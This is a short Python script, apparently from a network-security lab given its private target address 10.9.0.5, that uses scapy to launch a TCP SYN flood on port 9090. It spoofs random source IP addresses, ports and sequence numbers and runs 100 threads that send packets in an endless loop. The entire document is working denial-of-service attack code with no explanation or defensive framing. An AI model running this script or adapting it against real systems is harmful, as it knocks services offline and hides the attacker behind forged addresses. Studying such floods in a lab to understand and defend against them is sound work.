from scapy.all import IP, TCP, send
from ipaddress import IPv4Address
from random import getrandbits
from threading import Thread

target_ip = "10.9.0.5"
target_port = 9090

def syn_flood():
    ip = IP(dst=target_ip)
    tcp = TCP(dport=target_port, flags='S')

    while True:
        ip.src = str(IPv4Address(getrandbits(32)))   
        tcp.sport = getrandbits(16)
        tcp.seq = getrandbits(32)
        pkt = ip / tcp
        send(pkt, inter=0, loop=0, verbose=0)


for _ in range(100):  
    t = Thread(target=syn_flood)
    t.start()
